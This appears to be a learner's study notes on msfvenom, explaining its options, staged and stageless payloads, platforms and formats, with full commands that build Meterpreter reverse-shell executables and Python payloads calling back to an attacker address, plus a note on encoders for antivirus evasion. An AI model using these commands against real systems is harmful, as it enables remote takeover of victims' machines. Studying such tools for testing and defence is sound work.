# msfvenom-basics

# msfvenom payload syntax 
msfveno >> Metasploit standalone payload generator tool.

# Types: payloads, encoders,nops, platforms, archs, encrypt, formats.
Encoders: Encoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads. In this way, we can obfuscate the intent of the payload to evade AV and bypass security measures in place, no detection. 
List encoders >> msfvenom -l encoders

# Msfvenom options >> 
-p (payload) Specifies the payload to use. Example: -p windows/meterpreter/reverse_tcp
-e (encoder): Specifies an encoder to use for the payload. Example: -e x86/shikata_ga_nai
-f (format): Specifies the format of the output payload. Example: -f exe (Windows executable), -f elf (Linux executable), -f raw (raw binary), -f js (JavaScript), -f apk (Android), etc.
-a (architecture): Specifies the architecture for the payload. Example: -a x86 (32-bit), -a x64 (64-bit),
-s (space): Specifies the maximum size of the payload. Example: -s 300
--platform: Specifies the platform for the payload (e.g., Windows, Linux). Example: --platform windows
-x (template): Uses a specified executable as a template to embed the payload into. Example: -x /path/to/template.exe

# Payloads
Payloads: malicious scripts that an attacker uses to interact with a target machine in order to compromise it. The syntax of the payload caught my attention for further reading. 
# msfvenom -p <PAYLOAD> LHOST=<attacker_IP> LPORT=<attacker_PORT> -f <FORMAT> > <OUTPUT_FILE>

# Two major types of Payloads  
# Staged: They are commonly identified by a forward slash (/) in their name (e.g., windows/meterpreter/reverse_tcp). In the form of stager and stage. 
Stager >> Initial part of the payload, which sets up a connection between the target and the attacker. This stager is usually small and simple, designed to fit within tight constraints and establish a communication channel.(establishes the connection and then activates the payload that will do the main work).
Stage >> The larger part of the payload, which contains the main functionality (e.g., Meterpreter). Once the stager sets up the connection, it downloads and executes the stage from the attacker's machine (does the transaction).
Syntax: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > /path/to/output.exe
# Stageless: The use of _ instead of the second / in the payload name such as windows/meterpreter_reverse_tcp. Payloads contain the entire payload in a single, self-contained package. There is no separate stager and stage; everything needed to execute the payload is included in the initial file.
Syntax: msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > /path/to/output.exe
# Additionals

# Platforms
In msfvenom a payload defines the actions that will be performed on the target machine once the exploit is successful. For this reason msfvenom has platform options: a platform is loosely an operating system(mac, windows, linux etc) or scripting language(eg php, ruby etc) with a few exceptions, such as netware. When building our custom payload, we must build it specifically for the target operating system. We can have a customized payload using the --platform <targetplatform> syntax to designate our target platform.

# Architectures
The architecture of a payload specifies the type of CPU it is designed to run on. Common architectures include:
x86: 32-bit Intel/AMD processors.
x64: 64-bit Intel/AMD processors.
armle: ARM little-endian processors.
mips: MIPS processors.
cmd: Command-line interface architectures, typically for scripting.
# Example: Windows x86 (32-bit) Payload 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 -f exe > /home/user/Desktop/windows_x86_payload.exe

# Formats
The format specifies the type of file that will be generated by msfvenom. Different formats are suitable for different target environments. When we build our custom payload, we will use the -f switch and designate the format.
exe: Windows executable.
# Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > /home/user/Desktop/payload.exe
elf: Linux executable.
raw: Raw binary format.
macho: macOS executable.
apk: Android package.
python: Python script. 
# Example : msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > /home/user/Desktop/payload.py
java: Java bytecode.
powershell: PowerShell script.
asp: ASP script.
jsp: JSP script.






Steps
Installed msfvenom.No evidence, but make sure to install from trusted sources..
Basic commands >> man msfvenom;msfvenom -h; list payloads >> msfvenom -l <types> >> msfvenom -l payloads
Payload creation>> os type/language type
connectio
msfvenom -p <PAYLOAD> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f <FORMAT> > <OUTPUT_FILE>

Resources I utilized
https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/



understanding 
